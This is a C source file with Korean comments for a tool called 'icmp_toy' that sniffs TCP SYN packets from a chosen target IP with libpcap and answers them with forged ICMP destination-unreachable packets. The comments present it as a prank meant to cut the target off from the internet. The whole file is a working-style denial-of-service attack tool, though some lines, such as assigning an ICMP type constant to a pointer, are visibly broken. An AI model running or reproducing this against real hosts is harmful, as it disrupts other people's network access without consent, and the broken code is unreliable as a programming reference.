//
// 매우 좋은 유닉스 예제 프로그램
// # cp -f /usr/include/pcap/net/bpf.h /usr/include/net 
// # gcc -g -Wall -o icmp_toy icmp_toy.c -lpcap 
//
#include <sys/types.h> 
#include <sys/time.h> 
#include <netinet/in.h> 
#include <net/ethernet.h> 
#include <pcap/pcap.h> // libpcap를 위한 헤더화일 
#include <signal.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <errno.h> 
#include <unistd.h> 
#include <netinet/ip.h> 
#include <netinet/tcp.h> 
#include <netinet/ip_icmp.h> 

#define PROMISCUOUS 1 
// 자식 프로세스 생성 개수 
static int nchild = 5; 
char target_ip[16]; 

static pid_t *pids; 
static pcap_t *pd; 

// checksum 알고리즘를 구현한 함수 나는 copy & paste 히히 
unsigned short in_cksum(unsigned short *addr, int len) 
{ 
   int nleft = len; 
   int sum = 0; 
   unsigned short *w = addr; 
   unsigned short answer = 0; 

   while (nleft > 1) { 
      sum += *w++; 
      nleft -= 2; 
   } 

   if (nleft == 1) { 
      *(unsigned char *) (&answer) = *(unsigned char *) w; 
      sum += answer; 
   } 

   sum  = (sum >> 16) + (sum & 0xffff); 
   sum += (sum >> 16); 
   answer = ~sum; 
   return answer; 
} 

/*-------------------------------------------------------------------
icmp packet 을 만들어 보내는 함수 : 넌 이제 인터넷과 고립되는 거야!! 
-------------------------------------------------------------------*/ 
void send_icmp(int sockfd, struct iphdr *iph, struct tcphdr *tcph) 
{ 
   char buff[36]; // icmp packet 의 전체부분 

   char data[28]; // icmp data 부분 ip header:20bytes + ulp header:8bytes 

   /* 화면에 찍기 위해 ip를 임시저장하기 위한 공간 */ 
   int len;
   struct sockaddr     send;
   struct icmp        *icmp;
   struct sockaddr_in *willsend;

   willsend = (struct sockaddr_in *) &send;
   willsend->sin_family      = AF_INET;
   willsend->sin_addr.s_addr = iph->saddr;

   fprintf(stdout,"A player's number is (%d) : Shot!! ---<-@ %s n", getpid(), target_ip); 
   icmp = (struct icmp *) buff; 

   // 목적지 미도달 : ICMP type 
   icmp = ICMP_DEST_UNREACH; 
   icmp->icmp_code = ICMP_PROT_UNREACH; 
   icmp->icmp_id   = 0; 
   icmp->icmp_seq  = 0; 
   // icmp data 부분중에 패킷의 ip header 
   memcpy(data, iph, 20); 
   // icmp data 부분중에 패킷의 Upper Layer Protocol의 상위 8 bytes 
   memcpy(data + 20, tcph, 8); 
   // data부분을 icmp_data부분에 대입 
   memcpy(icmp->icmp_data, data, 28); 
   // 보내게 될 icmp packet의 길이 : 36 bytes 
   len = 8 + 20 + 8; 
   // icmp checksum field 계산 
   icmp->icmp_cksum = 0; 
   icmp->icmp_cksum = in_cksum((u_short *) icmp, len); 

   // 완성된 ICMP packet 보내기 
   sendto(sockfd, buff, len, 0, &send, sizeof(send)); 
} 

//
// 장난 칠 놈 컴ip 
void checkip(struct iphdr *iph, struct tcphdr *tcph) 
{ 
   int  sockfd; 
   char source_ip[16]; 

   strcpy(source_ip, (char *)inet_ntoa(iph->saddr)); 

   sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); 
   // ip 비교 아님 말구... 
   if (strcmp(target_ip, source_ip) == 0) send_icmp(sockfd, iph, tcph); 

   close(sockfd); 
} 

// ip header와 tcp header를 mapping 
void packet_info(char *user, int len) 
{ 
   struct iphdr  *iph; 
   struct tcphdr *tcph; 
   // ip header 를 포인터 
   iph  = (struct iphdr *) user; 
   // tcp header 를 포인터 
   tcph = (struct tcphdr *) (user + iph->ihl *4); 
   checkip(iph, tcph); 
} 


void sig_int(int sig) 
{ 
   int i; 

   // 모든 자식프로세스를 죽인다. 
   for (i=0; i<nchild; i++) kill(pids[i],SIGTERM); 

   /* --------------------------------------------- 
       모든 자식 프로세스가 죽을 때까지 기다린다. 
       더 이상 자식프로세스가 없으면 wait()는 -1를 
       리턴하기 때문에 while loop를 빠져나오게 되고 
       부모도 exit(0)에 의해 종료한다. 
   --------------------------------------------*/ 
   while(wait(NULL) > 0) ; 

   fprintf (stdout,"Bye!!n"); 
   exit(0); 
} 

// prefork방식을 이용한 child pool 만들기 
pid_t child_make(int i, pcap_t *pd, int datalink) 
{
   pid_t pid; 
   void child_main(int, pcap_t *, int); 

   if ((pid=fork()) > 0) { 
      return pid; // parent 인경우 자식프로세스의 pid를 리턴 
   } 
   // child인 경우 아래 함수 호출 
   child_main(i, pd, datalink); 
} 

void child_main(int i, pcap_t *pd, int datalink) 
{ 
   void packet_loop(pcap_t *, int); 

   printf("CHILD %ld starting\n", (long) getpid()); 

   packet_loop(pd, datalink); 
} 

// unp에 있다. 
char *next_pcap(pcap_t *pd, int *len) 
{ 
   char *ptr; 
   struct pcap_pkthdr hdr; 

   while( (ptr = (char *) pcap_next(pd, &hdr)) == NULL) ; 

   *len = hdr.caplen; 
   return (ptr); 
} 

void packet_loop(pcap_t *pd, int datalink) 
{ 
   int   len; 
   char *ptr; 

   /* ----------------------------------------------- 
   계속적으로 packet을 읽어들이는 loop 
   ---------------------------------------------*/ 
   for (;;) { 
       ptr = next_pcap(pd, &len); 
       switch (datalink) { 
       case DLT_EN10MB : 
            packet_info(ptr+14, len-14); 
            break; 
       } 
   } 
} 

void usage(void) 
{ 
   fprintf(stdout, "SYNOPSIS : icmp_toy xxx.xxx.xxx.xxx(target ip address)\n"); 
} 

int main(int argc, char *argv[]) 
{ 
   struct bpf_program fcode; 
   char *device, *filter_rule; 
   char  ebuf[PCAP_ERRBUF_SIZE]; 
   int i, j, snaplen = 68; 
   bpf_u_int32 localnet, netmask; 

   //시그널 등록 
   signal(SIGINT, sig_int); 

   if (argc < 2) { 
      usage(); 
      exit(1); 
   } 

   // 장난 칠 컴퓨터 호스트 주소를 복사... 
   strcpy(target_ip, argv[1]); 

   /* --------------------------------------- 
   tcp syn packet만 필터링한다 
   --------------------------------------*/ 
   filter_rule   = "tcp and tcp[13:1] & 2 != 0"; 
   //filter_rule = "ip"; 

   device = pcap_lookupdev(ebuf); 
   if (device == NULL) { 
      perror(ebuf); 
      exit(1); 
   }

   pd = pcap_open_live(device, snaplen, PROMISCUOUS, 1000, ebuf); 
   if (pd == NULL) { 
      perror(ebuf); 
      exit(1); 
   } 

   i = pcap_snapshot(pd); 
   if (snaplen < i) { 
      perror(ebuf); 
      exit(1); 
   } 

   if (pcap_lookupnet(device, &localnet, &netmask, ebuf) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   setuid(getuid()); 

   if (pcap_compile(pd, &fcode, filter_rule, 0, netmask) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   if (pcap_setfilter(pd, &fcode) < 0) { 
      perror(ebuf); 
      exit(1); 
   } 

   fflush(stderr); 

   pids = calloc(nchild, sizeof(pid_t)); 
   /* ---------------------------------------------- 
   nchild 만큼 자식프로세스를 생성하기 위한 loop 
   --------------------------------------------*/ 
   for (j=0; j<nchild; j++) 
       pids[j] = child_make(j, pd, pcap_datalink(pd)); 

   for (;;) pause(); // signal 이 발생할때까지 실행을 지연시킨다. 
} 
